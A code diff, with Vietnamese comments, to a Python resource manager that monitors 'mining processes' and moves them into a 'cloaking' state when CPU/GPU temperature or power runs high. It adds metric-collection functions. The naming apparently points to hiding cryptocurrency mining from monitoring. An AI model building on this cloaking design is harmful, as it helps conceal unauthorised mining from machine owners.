@@ -3,6 +3,8 @@ Module resource_manager.py - Quản lý tài nguyên (CPU, GPU, Network...) theo
 Đã refactor để loại bỏ toàn bộ asyncio/await, gộp temperature_watcher và power_watcher vào một luồng duy nhất,
 và quản lý trạng thái cloaking theo chuỗi:
 (normal) -> (cloaking) -> (cloaked) -> (restoring) -> (normal).
+
+Đồng thời, bổ sung hàm collect_metrics, collect_all_metrics ở dạng synchronous.
 """
 
 import logging
@@ -16,7 +18,7 @@ import time
 from typing import List, Any, Dict, Optional, Tuple
 from itertools import count
 
-# Giả sử các import dưới đây là cần thiết cho dự án
+# Các import liên quan đến dự án
 from .utils import MiningProcess
 from .cloak_strategies import CloakStrategyFactory
 from .resource_control import ResourceControlFactory
@@ -134,7 +136,7 @@ class SharedResourceManager:
 
     def get_gpu_usage_percent(self, pid: int) -> float:
         """
-        Trả về % GPU usage của tiến trình PID.
+        Trả về % GPU usage của tiến trình PID (đồng bộ).
 
         :param pid: PID của tiến trình.
         :return: Phần trăm GPU usage, 0.0 nếu có lỗi hoặc không tìm thấy GPU.
@@ -256,23 +258,11 @@ class ResourceManager(IResourceManager):
     Đảm bảo quá trình cloaking tuân theo chuỗi:
         (normal) -> (cloaking) -> (cloaked) -> (restoring) -> (normal).
 
-    Attributes:
-        _instance (ResourceManager): Thể hiện singleton.
-        logger (logging.Logger): Logger chính.
-        config (ConfigModel): Đối tượng cấu hình.
-        event_bus (EventBus): Cơ chế pub/sub.
-        _stop_flag (bool): Cờ đánh dấu dừng watchers.
-        mining_processes_lock (threading.RLock): Khóa bảo vệ danh sách mining_processes.
-        mining_processes (List[MiningProcess]): Danh sách tiến trình khai thác.
-        resource_adjustment_queue (queue.PriorityQueue): Hàng đợi ưu tiên điều chỉnh tài nguyên (cloaking/restoration).
-        watchers (List[threading.Thread]): Danh sách thread đang chạy.
-        shared_resource_manager (SharedResourceManager): Đối tượng quản lý tài nguyên chung (NVML, GPU...).
-        _counter (count): Bộ đếm để tạo priority (nếu cần).
-        process_states (Dict[int, str]): Bản đồ PID -> trạng thái ("normal", "cloaking", "cloaked", "restoring").
+    Cung cấp hàm collect_metrics, collect_all_metrics (đồng bộ) để lấy metrics cho anomaly_detector hoặc các module khác.
     """
 
     _instance = None
-    _instance_lock = threading.Lock()  # Thay cho asyncio.Lock()
+    _instance_lock = threading.Lock()
 
     def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
         """
@@ -302,7 +292,7 @@ class ResourceManager(IResourceManager):
         # Cờ dừng watchers
         self._stop_flag = False
 
-        # Lock đồng bộ (thay cho aiorwlock)
+        # Lock đồng bộ
         self.mining_processes_lock = threading.RLock()
         self.mining_processes: List[MiningProcess] = []
 
@@ -323,6 +313,78 @@ class ResourceManager(IResourceManager):
 
         # Đăng ký lắng nghe event 'resource_adjustment'
         self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
+
+    # ---------------- THÊM 2 HÀM COLLECT_METRICS & COLLECT_ALL_METRICS (SYNC) ---------------
+    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
+        """
+        Thu thập metrics của một tiến trình (CPU, GPU, Cache, Network...).
+        Chạy đồng bộ, không dùng async/await.
+
+        :param process: Đối tượng MiningProcess.
+        :return: dict { 'cpu_usage', 'memory_usage', 'gpu_usage', 'network_usage', 'cache_usage' }
+        """
+        try:
+            if not psutil.pid_exists(process.pid):
+                self.logger.warning(f"PID={process.pid} không tồn tại.")
+                return {}
+
+            proc_obj = psutil.Process(process.pid)
+            # CPU usage
+            cpu_pct = proc_obj.cpu_percent(interval=1)
+            # RAM MB
+            mem_mb = proc_obj.memory_info().rss / (1024**2)
+
+            # GPU usage
+            gpu_pct = 0.0
+            if self.is_gpu_initialized():
+                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)
+
+            # Network usage => tùy logic, ví dụ disk IO limit
+            disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)  # Giả sử hàm sync
+            # Cache usage
+            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid)
+
+            metrics = {
+                'cpu_usage': float(cpu_pct),
+                'memory_usage': float(mem_mb),
+                'gpu_usage': float(gpu_pct),
+                'network_usage': float(disk_mbps),
+                'cache_usage': float(cache_l),
+            }
+            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
+            return metrics
+        except Exception as e:
+            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
+            return {}
+
+    def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
+        """
+        Thu thập metrics cho tất cả mining_processes => { 'pid': {metrics}, ... }.
+        Đồng bộ, dùng lock bảo vệ self.mining_processes.
+        
+        :return: dict, key=pid(str), value=dict metrics
+        """
+        metrics_data: Dict[str, Dict[str, Any]] = {}
+        # Acquire lock
+        if not self.mining_processes_lock.acquire(timeout=5):
+            self.logger.error("Timeout lock collect_all_metrics.")
+            return metrics_data
+
+        try:
+            for p in self.mining_processes:
+                res = self.collect_metrics(p)
+                if res:
+                    metrics_data[str(p.pid)] = res
+                else:
+                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
+            self.logger.debug(f"Dữ liệu metrics đã thu thập (all): {metrics_data}")
+        except Exception as e:
+            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
+        finally:
+            self.mining_processes_lock.release()
+
+        return metrics_data
+    # -----------------------------------------------------------------------------------------
 
     def start(self):
         """
@@ -483,7 +545,6 @@ class ResourceManager(IResourceManager):
         while not self._stop_flag:
             try:
                 priority, count_val, task = self.resource_adjustment_queue.get(timeout=1)
-
                 p = task['process']
                 pid = p.pid
 
@@ -506,16 +567,15 @@ class ResourceManager(IResourceManager):
                         if s and hasattr(s, 'apply'):
                             s.apply(p)
 
-                    # Sau khi cloak xong => set state = 'cloaked'
+                    # Cloak xong => set state = 'cloaked'
                     self.process_states[pid] = "cloaked"
                     self.logger.info(f"Process PID={pid} chuyển trạng thái -> cloaked.")
 
                 elif task['type'] == 'restoration':
+                    # restore => state='normal'
                     if self.shared_resource_manager:
-                        # Đặt trạng thái = 'restoring'
                         self.process_states[pid] = "restoring"
                         self.shared_resource_manager.restore_resources(p)
-                        # Khi restore xong => set về 'normal'
                         self.process_states[pid] = "normal"
                         self.logger.info(f"Process PID={pid} đã restore => chuyển trạng thái -> normal.")
 
@@ -536,7 +596,6 @@ class ResourceManager(IResourceManager):
         """
         mon_params = self.config.monitoring_parameters
         interval = mon_params.get("temperature_monitoring_interval_seconds", 60)
-        # Giả sử hai watcher có cùng một khoảng thời gian => dùng chung 'interval'
 
         # Ngưỡng nhiệt độ
         temp_lims = self.config.temperature_limits
@@ -588,7 +647,7 @@ class ResourceManager(IResourceManager):
                         mproc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
                         self.mining_processes.append(mproc)
 
-                        # Nếu PID lần đầu được phát hiện => set = "normal"
+                        # Nếu PID lần đầu => state='normal'
                         if mproc.pid not in self.process_states:
                             self.process_states[mproc.pid] = "normal"
                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
@@ -619,9 +678,6 @@ class ResourceManager(IResourceManager):
         """
         Kiểm tra nhiệt độ CPU/GPU cho tất cả mining_processes,
         nếu quá ngưỡng thì enqueue cloaking (chỉ khi state='normal').
-
-        :param cpu_max_temp: Ngưỡng nhiệt độ CPU (°C).
-        :param gpu_max_temp: Ngưỡng nhiệt độ GPU (°C).
         """
         if not self.mining_processes_lock.acquire(timeout=5):
             self.logger.warning("Timeout lock => check_temperature_all.")
@@ -632,7 +688,6 @@ class ResourceManager(IResourceManager):
                 pid = mproc.pid
                 current_state = self.process_states.get(pid, "normal")
 
-                # Nếu PID không ở trạng thái "normal", bỏ qua enqueue cloaking
                 if current_state != "normal":
                     continue
 
@@ -645,15 +700,12 @@ class ResourceManager(IResourceManager):
                 if not isinstance(g_temps, (list, tuple)):
                     g_temps = [g_temps]
 
-                # Kiểm tra CPU temp
                 if cpu_temp > cpu_max_temp:
                     self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={pid}).")
-                    # Đặt state="cloaking" => enqueue
                     self.process_states[pid] = "cloaking"
                     self.enqueue_cloaking(mproc)
-                    continue  # Cloaking xong => không cần check GPU
+                    continue
 
-                # Kiểm tra GPU temp
                 if any(t > gpu_max_temp for t in g_temps if t):
                     self.logger.warning(f"Nhiệt độ GPU {g_temps}°C > {gpu_max_temp}°C (PID={pid}).")
                     self.process_states[pid] = "cloaking"
@@ -661,16 +713,12 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"Lỗi check_temperature_all: {e}\n{traceback.format_exc()}")
         finally:
-            if self.mining_processes_lock.locked():
-                self.mining_processes_lock.release()
+            self.mining_processes_lock.release()
 
     def check_power_all(self, cpu_max_power: float, gpu_max_power: float):
         """
         Kiểm tra công suất CPU/GPU cho tất cả mining_processes,
         nếu vượt ngưỡng thì enqueue cloaking (chỉ khi state='normal').
-
-        :param cpu_max_power: Ngưỡng công suất CPU (W).
-        :param gpu_max_power: Ngưỡng công suất GPU (W).
         """
         if not self.mining_processes_lock.acquire(timeout=5):
             self.logger.warning("Timeout lock => check_power_all.")
@@ -680,21 +728,18 @@ class ResourceManager(IResourceManager):
             for mproc in self.mining_processes:
                 pid = mproc.pid
                 current_state = self.process_states.get(pid, "normal")
-
                 if current_state != "normal":
                     continue
 
-                c_power = get_cpu_power(pid)   # Giả sử hàm đồng bộ
-                g_power = get_gpu_power(pid)   # Giả sử hàm đồng bộ => có thể trả list
+                c_power = get_cpu_power(pid)
+                g_power = get_gpu_power(pid)
 
-                # Check CPU power
                 if c_power and c_power > cpu_max_power:
                     self.logger.warning(f"CPU={c_power}W > {cpu_max_power}W => cloak (PID={pid}).")
                     self.process_states[pid] = "cloaking"
                     self.enqueue_cloaking(mproc)
                     continue
 
-                # Check GPU power
                 if isinstance(g_power, list):
                     total_g = sum(g_power)
                     if total_g > gpu_max_power:
@@ -709,8 +754,7 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"Lỗi check_power_all: {e}\n{traceback.format_exc()}")
         finally:
-            if self.mining_processes_lock.locked():
-                self.mining_processes_lock.release()
+            self.mining_processes_lock.release()
 
     def shutdown(self):
         """
@@ -719,7 +763,7 @@ class ResourceManager(IResourceManager):
         self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")
         self._stop_flag = True
 
-        # Chờ các thread dừng (nếu cần)
+        # Dừng các thread watchers
         for w in self.watchers:
             w.join(timeout=2)
 
@@ -727,13 +771,12 @@ class ResourceManager(IResourceManager):
         if self.shared_resource_manager:
             self.shared_resource_manager.shutdown_nvml()
 
-        # Khôi phục tài nguyên (tùy chính sách). Ví dụ:
+        # Khôi phục tài nguyên (nếu PID đang cloaked)
         try:
             if self.mining_processes_lock.acquire(timeout=5):
                 for proc in self.mining_processes:
                     pid = proc.pid
                     state = self.process_states.get(pid, "normal")
-                    # Chỉ restore nếu đang cloaked => gán restoring => normal
                     if state == "cloaked":
                         self.logger.info(f"Auto-restore PID={pid} trước khi tắt.")
                         self.process_states[pid] = "restoring"
